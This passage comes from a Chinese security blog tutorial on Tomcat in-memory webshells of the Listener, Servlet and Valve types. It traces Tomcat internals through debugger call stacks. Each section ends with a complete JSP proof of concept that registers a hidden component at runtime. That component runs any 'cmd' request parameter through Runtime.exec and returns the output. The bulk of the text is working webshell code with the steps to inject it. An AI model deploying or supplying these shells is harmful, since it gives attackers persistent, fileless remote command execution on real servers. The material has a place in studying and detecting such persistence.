System.out.println(&quot;ServletRequest destroyed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Listener-的创建"><a href="#Listener-的创建" class="headerlink" title="Listener 的创建"></a>Listener 的创建</h6><p>下断点，调试，看调用栈：</p><img src="/images/image-20240922160240310.png"><p>是 StandardContext#fireRequestInitEvent 调用了我的 requestInitialized 方法，跟进它：</p><img src="/images/image-20240922160532778.png"><p>从下往上找这个 listener 是哪来的，最终找到 instances[] 数组。这个数组又是通过 getApplicationEventListeners 获取的，跟进一下：</p><img src="/images/image-20240922160659666.png"><p>applicationEventListenersList 是 StandardContext 的一个成员属性，关注一下它是在哪被赋值的：</p><img src="/images/image-20240922160832102.png"><p>有 setApplicationEventListeners 方法和 addApplicationEventListener 方法。添加单个 listener 还是 addApplicationEventListener 用起来更简便一些。</p><img src="/images/image-20240922161612183.png"><h6 id="StandardContext-的获取"><a href="#StandardContext-的获取" class="headerlink" title="StandardContext 的获取"></a>StandardContext 的获取</h6><p>接下来就是获取 StandardContext 了，往前看一步 StandardHostValve#invoke ：</p><img src="/images/image-20240922162013693.png"><p>这里是直接通过 request.getContext() 来获取的，由于 JSP 内置了 request 对象，我们也可以使用同样的方式来获取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    reqF.setAccessible(true);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext context = (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>另一种获取方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>当然也可以像之前 Filter 内存马那样去获取 StandardContext 。</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    class ListenerMemShell implements ServletRequestListener &#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void requestInitialized(ServletRequestEvent sre) &#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            try &#123;</span><br><span class="line">                cmd = sre.getServletRequest().getParameter(&quot;cmd&quot;);</span><br><span class="line">                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();</span><br><span class="line">                Field requestField = Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;).getDeclaredField(&quot;request&quot;);</span><br><span class="line">                requestField.setAccessible(true);</span><br><span class="line">                Request request = (Request) requestField.get(requestFacade);</span><br><span class="line">                Response response = request.getResponse();</span><br><span class="line"></span><br><span class="line">                if (cmd != null) &#123;</span><br><span class="line">                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    int i = 0;</span><br><span class="line">                    byte[] bytes = new byte[1024];</span><br><span class="line">                    while ((i = inputStream.read(bytes)) != -1) &#123;</span><br><span class="line">                        response.getWriter().write(new String(bytes, 0, i));</span><br><span class="line">                        response.getWriter().write(&quot;\r\n&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void requestDestroyed(ServletRequestEvent sre) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    ServletContext servletContext = request.getServletContext();</span><br><span class="line">    Field applicationContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    applicationContextField.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    standardContextField.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    ListenerMemShell listener = new ListenerMemShell();</span><br><span class="line">    standardContext.addApplicationEventListener(listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Tomcat-Servlet-内存马"><a href="#Tomcat-Servlet-内存马" class="headerlink" title="Tomcat Servlet 内存马"></a>Tomcat Servlet 内存马</h2><p>动态注册一个自定义的 Servlet 。</p><h4 id="源码调试-2"><a href="#源码调试-2" class="headerlink" title="源码调试"></a>源码调试</h4><p>要想在内存中动态注册一个自定义的 Servlet ，同样需要知道 Servlet 是如何创建的。</p><p>由于在初始化 Servlet 之前会先初始化 Listener 和 Filter ，为了排除它们的干扰，我先将项目里的 Listener 和 Filter 全部移除，创造一个只有 Servlet 的世界。</p><p>要想站在漏洞发现者的角度去看这个问题是挺难的，我们现在直接给出结论：</p><p>StandardContext#startInternal() 在 web 容器启动时调用，这其中有两个分支调用，</p><p>一是调用 LifecycleBase#fireLifecycleEvent(String, Object)，最终调用到 StandardWrapper#setServletClass(String) 完成 Servlet 初始化；</p><p>二是调用 StandardContext#loadOnStartup(Container) ，最终调用 StandardWrapper#loadServlet() 完成 Servlet 装载。</p><h6 id="Servlet-初始化"><a href="#Servlet-初始化" class="headerlink" title="Servlet 初始化"></a>Servlet 初始化</h6><p>在 <code>org.apache.catalina.core.StandardWrapper#setServletClass()</code> 处下断点调试，调用栈如下：</p><img src="/images/image-20240924161027234.png"><p>往前看一步，看 ContextConfig#configureContext(WebXml)：</p><img src="/images/image-20240924162357053.png"><p>这其中有一部分是对 Servlet 的设置，主要是从 web.xml 配置文件读取的。因为我用的是注解配置，所以这个对象里面并没有我自定义的一些 Servlet ，这里边只有一些默认自带的 Servlet ，但是并不影响我们模仿这种方式来注册一个 Servlet 。</p><p>用 Wrapper 来封装 Servlet ，最后放进 context 的也是这个 wrapper ：</p><img src="/images/image-20240924164648465.png"><p>添加完 wrapper 之后，还要添加一个 ServletMapping 映射，相当于 Servlet 名称与路由的对应：</p><img src="/images/image-20240926133429655.png"><p>以上就是向 Context 中封装 Servlet 的过程，模仿这样的方式向 Context 中封装 Servlet ，也即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">wrapper.setServlet(servlet);</span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(&quot;/miaoji&quot;, servlet.getServletName());</span><br></pre></td></tr></table></figure><p>这里取一些必要的属性去设置就行了。</p><p>提一嘴，注解配置的 Servlet 初始化过程是这样的，最终是调用 WebAnnotationSet#loadApplicationServletAnnotations ：</p><img src="/images/image-20240924171009930.png"><p>它跟 web.xml 文件配置的分叉点在 ContextConfig#configureStart() 中：</p><img src="/images/image-20240924171550636.png"><p>默认调用 webConfig() 方法从 xml 文件中配置，如果没有设置忽略注解的话，还会调用 applicationAnnotationsConfig() 进行注解配置。</p><h6 id="Servlet-装载"><a href="#Servlet-装载" class="headerlink" title="Servlet 装载"></a>Servlet 装载</h6><p>调用栈如下：</p><img src="/images/image-20240926131349206.png"><p>进入 StandardContext#loadOnStartUp(Container) 看看：</p><img src="/images/image-20240924180044910.png"><p>这个方法通过对 loadOnStartUp 属性的检测，就实现了一个功能：根据 loadOnStartUp 的取值来决定 Servlet 对象什么时候创建：</p><p>（1）loadOnStartUp  为负整数，则在第一次访问时创建 Servlet 对象。<br>（2）loadOnStartUp 为 0 或正整数，则在服务器启动时创建 Servlet 对象，数字越小优先级越高。</p><p>然后调用 wrapper.load() 来加载：</p><img src="/images/image-20240926132057153.png"><p>我个人觉得 loadOnStartUp 属性倒是无足轻重，无论是什么时候创建 Servlet 对象，只要能创建就行了。设置 loadOnStartUp 为正数的好处在于第一次访问 Servlet 的时候速度更快，因为在服务器启动时已经创建了。</p><h4 id="addServlet-的实现"><a href="#addServlet-的实现" class="headerlink" title="addServlet 的实现"></a>addServlet 的实现</h4><p>前面说到要想在内存中动态注册一个自定义的 Servlet ，需要知道 Servlet 是如何创建的。但是一定如此吗？或许我们可以不用知道 Servlet 是如何被创建的，只需要知道 Servlet 要如何动态注册就行了。</p><p>ServletContext 类中提供了 addServlet 用来动态注册 Servlet ，而 ServletContext 是个抽象类，关于这个方法的实现在 ApplicationContext 类中。我们来看 ApplicationContext 类的 addServlet 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">private ServletRegistration.Dynamic addServlet(String servletName, String servletClass,</span><br><span class="line">        Servlet servlet, Map&lt;String,String&gt; initParams) throws IllegalStateException &#123;</span><br><span class="line"></span><br><span class="line">    if (servletName == null || servletName.equals(&quot;&quot;)) &#123;</span><br><span class="line">        throw new IllegalArgumentException(sm.getString(</span><br><span class="line">                &quot;applicationContext.invalidServletName&quot;, servletName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">        //TODO Spec breaking enhancement to ignore this restriction</span><br><span class="line">        throw new IllegalStateException(</span><br><span class="line">                sm.getString(&quot;applicationContext.addServlet.ise&quot;,</span><br><span class="line">                        getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Wrapper wrapper = (Wrapper) context.findChild(servletName);</span><br><span class="line"></span><br><span class="line">    // Assume a &#x27;complete&#x27; ServletRegistration is one that has a class and</span><br><span class="line">    // a name</span><br><span class="line">    if (wrapper == null) &#123;</span><br><span class="line">        wrapper = context.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        context.addChild(wrapper);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (wrapper.getName() != null &amp;&amp;</span><br><span class="line">                wrapper.getServletClass() != null) &#123;</span><br><span class="line">            if (wrapper.isOverridable()) &#123;</span><br><span class="line">                wrapper.setOverridable(false);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ServletSecurity annotation = null;</span><br><span class="line">    if (servlet == null) &#123;</span><br><span class="line">        wrapper.setServletClass(servletClass);</span><br><span class="line">        Class&lt;?&gt; clazz = Introspection.loadClass(context, servletClass);</span><br><span class="line">        if (clazz != null) &#123;</span><br><span class="line">            annotation = clazz.getAnnotation(ServletSecurity.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        if (context.wasCreatedDynamicServlet(servlet)) &#123;</span><br><span class="line">            annotation = servlet.getClass().getAnnotation(ServletSecurity.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (initParams != null) &#123;</span><br><span class="line">        for (Map.Entry&lt;String, String&gt; initParam: initParams.entrySet()) &#123;</span><br><span class="line">            wrapper.addInitParameter(initParam.getKey(), initParam.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ServletRegistration.Dynamic registration =</span><br><span class="line">            new ApplicationServletRegistration(wrapper, context);</span><br><span class="line">    if (annotation != null) &#123;</span><br><span class="line">        registration.setServletSecurity(new ServletSecurityElement(annotation));</span><br><span class="line">    &#125;</span><br><span class="line">    return registration;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从中同样可以提取出对于 wrapper 的封装过程。这里返回的是一个 ApplicationServletRegistration 对象，至于 mappings 映射的添加，在 ApplicationServletRegistration 的 addMapping 方法里：</p><img src="/images/image-20240926140011667.png"><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><p>下面是利用 jsp 的实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.*&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.http.HttpServletRequest&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    class Shell_Servlet implements Servlet&#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void init(ServletConfig config) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public ServletConfig getServletConfig() &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">            HttpServletRequest req = (HttpServletRequest) request;</span><br><span class="line">            if (req.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public String getServletInfo() &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    ServletContext servletContext =  request.getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    // 更简单的方法 获取StandardContext</span><br><span class="line">    // Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    // reqF.setAccessible(true);</span><br><span class="line">    // Request req = (Request) reqF.get(request);</span><br><span class="line">    // StandardContext standardContext = (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    Shell_Servlet servlet = new Shell_Servlet();</span><br><span class="line">    String name = servlet.getClass().getSimpleName();</span><br><span class="line">    Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(1);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">    wrapper.setServlet(servlet);</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(&quot;/miaoji&quot;, name);</span><br><span class="line"></span><br><span class="line">    out.println(&quot;Done!&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Tomcat-Valve-内存马"><a href="#Tomcat-Valve-内存马" class="headerlink" title="Tomcat Valve 内存马"></a>Tomcat Valve 内存马</h2><p>Tomcat 中，管道（Pipeline）就像一个请求处理的通道，而 Valve 是放在管道中的处理站。每个请求进入 Tomcat 时，会沿着这个管道依次经过各个 Valve，直到最终处理完成。</p><p>StandardPipeline 管理着每个容器的基本 valve（Basic Valve）：StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve 。</p><p>Valve 内存马的思路就是要在内存中动态添加一个自定义的 Valve 。这里就以 StandardEngineValve 为例，关注一下它的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.catalina.core;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line"></span><br><span class="line">import org.apache.catalina.Host;</span><br><span class="line">import org.apache.catalina.connector.Request;</span><br><span class="line">import org.apache.catalina.connector.Response;</span><br><span class="line">import org.apache.catalina.valves.ValveBase;</span><br><span class="line"></span><br><span class="line">final class StandardEngineValve extends ValveBase &#123;</span><br><span class="line"></span><br><span class="line">    //------------------------------------------------------ Constructor</span><br><span class="line">    public StandardEngineValve() &#123;</span><br><span class="line">        super(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // --------------------------------------------------------- Public Methods</span><br><span class="line"></span><br><span class="line"> @Override</span><br><span class="line">    public final void invoke(Request request, Response response)</span><br><span class="line">        throws IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        // Select the Host to be used for this Request</span><br><span class="line">        Host host = request.getHost();</span><br><span class="line">        if (host == null) &#123;</span><br><span class="line">            // HTTP 0.9 or HTTP 1.0 request without a host when no default host</span><br><span class="line">            // is defined.</span><br><span class="line">            // Don&#x27;t overwrite an existing error</span><br><span class="line">            if (!response.isError()) &#123;</span><br><span class="line">                response.sendError(404);</span><br><span class="line">            &#125;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (request.isAsyncSupported()) &#123;</span><br><span class="line">            request.setAsyncSupported(host.getPipeline().isAsyncSupported());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Ask this Host to process this request</span><br><span class="line">        host.getPipeline().getFirst().invoke(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继承了 ValveBase ，实现了 invoke 方法，并且 invoke 方法中能获取到 request 和 response 。</p><p>StandardPipeline 的 addValve 方法可以直接添加 valve ，而 StandardContext 的 getPipeline 方法又能直接获取到 StandardPipeline ，所以如何添加 valve 就一目了然了。</p><h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.*&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    class EvilValve extends ValveBase &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void invoke(Request request, Response response) throws IOException, ServletException &#123;</span><br><span class="line">            HttpServletRequest req = (HttpServletRequest) request;</span><br><span class="line">            if (req.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">            &#125;</span><br><span class="line">            // 放行</span><br><span class="line">            getNext().invoke(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    // 更简单的方法获取 StandardContext</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    reqF.setAccessible(true);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext standardContext = (StandardContext) req.getContext();</span><br><span class="line">    // 添加自定义 valve</span><br><span class="line">    standardContext.getPipeline().addValve(new EvilValve());</span><br><span class="line">    out.println(&quot;Done!&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">Drunkbaby  -  Java 内存马系列 - 03 - Tomcat 之 Filter 型内存马</a></p><p><a href="https://goodapple.top/archives/1355">枫  -  Java 安全学习 —— 内存马</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">Longlone  -  Tomcat - Servlet 型内存马</a></p><p><a href="https://www.javasec.org/javaweb/MemoryShell/">su18  -  1.3.8. JavaWeb 内存马基础</a></p>]]></content>
    
    
      
      
